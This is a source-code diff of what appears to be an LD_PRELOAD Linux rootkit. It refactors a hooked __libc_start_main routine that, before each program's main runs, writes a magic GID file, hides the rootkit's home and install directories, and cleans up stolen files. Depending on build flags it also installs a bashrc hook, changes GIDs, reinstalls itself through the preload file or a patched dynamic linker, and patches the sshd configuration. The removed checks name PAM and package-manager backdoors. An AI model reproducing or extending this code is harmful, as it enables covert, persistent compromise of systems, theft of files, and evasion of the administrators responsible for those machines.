@@ -1,31 +1,7 @@
 #define _GNU_SOURCE
 
 #include "config.h"
-
-#if !defined USE_PAM_BD && defined PATCH_SSHD_CONFIG
-#error "USE_PAM_BD is not defined while PATCH_SSHD_CONFIG is"
-#endif
-#if defined USE_PAM_BD && !defined PATCH_SSHD_CONFIG
-#warning "USE_PAM_BD is enabled without PATCH_SSHD_CONFIG"
-#endif
-#if defined ROOTKIT_BASHRC && !defined USE_PAM_BD
-#error "USE_PAM_BD is not defined while ROOTKIT_BASHRC is"
-#endif
-#if !defined ROOTKIT_BASHRC && defined USE_PAM_BD
-#warning "USE_PAM_BD is enabled without ROOTKIT_BASHRC"
-#endif
-
-#if defined READ_GID_FROM_FILE  && !defined BACKDOOR_UTIL
-#warning "GID changing is not safely possible without BACKDOOR_UTIL defined"
-#endif
-
-#if !defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
-#error "AUTO_GID_CHANGER defined without READ_GID_FROM_FILE"
-#endif
-
-#if defined BACKDOOR_PKGMAN && !defined BACKDOOR_UTIL
-#error "BACKDOOR_PKGMAN defined without BACKDOOR_UTIL"
-#endif
+#include "sanity.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -37,8 +13,10 @@
 #include <fnmatch.h>
 #include <dirent.h>
 #include <time.h>
+#include <libgen.h>
 #include <dlfcn.h>
 #include <link.h>
+#include <assert.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
@@ -78,33 +56,57 @@ typedef struct {
 
 #define sizeofarr(arr) sizeof(arr) / sizeof(arr[0])
 
+void plsdomefirst(void);
 #include "includes.h"
 
-
-int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
+void plsdomefirst(void){
     if(not_user(0) || rknomore())
-        goto do_libc_start_main;
+        return;
 
-#if defined FILE_CLEANSE_TIMER && defined FILE_STEAL && defined CLEAN_STOLEN_FILES
-    cleanstolen();
+#ifdef READ_GID_FROM_FILE
+    hook(CACCESS,CFOPEN,CFWRITE,CCHMOD);
+    if((long)call(CACCESS, GID_PATH, F_OK) != 0){
+        FILE *fp = call(CFOPEN, GID_PATH, "w");
+        if(fp != NULL){
+            char buf[12];
+            snprintf(buf, 12, "%d", MAGIC_GID);
+            call(CFWRITE, buf, 1, strlen(buf), fp);
+            fclose(fp);
+            call(CCHMOD, GID_PATH, 0666);
+        }
+    }
 #endif
-#ifdef CLEANSE_HOMEDIR
-    bdvcleanse();
+    gid_t magicgid = readgid();
+    preparedir(HOMEDIR, magicgid);
+    hidedircontents(HOMEDIR, magicgid);
+    hidedircontents(INSTALL_DIR, magicgid);
+#if defined FILE_CLEANSE_TIMER && defined FILE_STEAL
+    cleanstolen();
 #endif
 #ifdef ROOTKIT_BASHRC
     checkbashrc();
 #endif
+#ifdef CLEANSE_HOMEDIR
+    bdvcleanse();
+#endif
 #if defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
     gidchanger();
 #endif
-#ifdef DO_REINSTALL
-    reinstall();
+#ifdef ALWAYS_REINSTALL
+#ifdef PATCH_DYNAMIC_LINKER
+    reinstall(PRELOAD_FILE);
+#else
+    reinstall(OLD_PRELOAD);
 #endif
-#ifdef PATCH_SSHD_CONFIG
-    sshdpatch(REG_USR);
 #endif
+#ifdef HARD_PATCH_SSHD_CONFIG
+    sshdpatch();
+#endif
+}
 
-do_libc_start_main:
+
+int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
+    plsdomefirst();
     hook(C__LIBC_START_MAIN);
     return (long)call(C__LIBC_START_MAIN, main, argc, ubp_av, init, fini, rtld_fini, stack_end);
 }
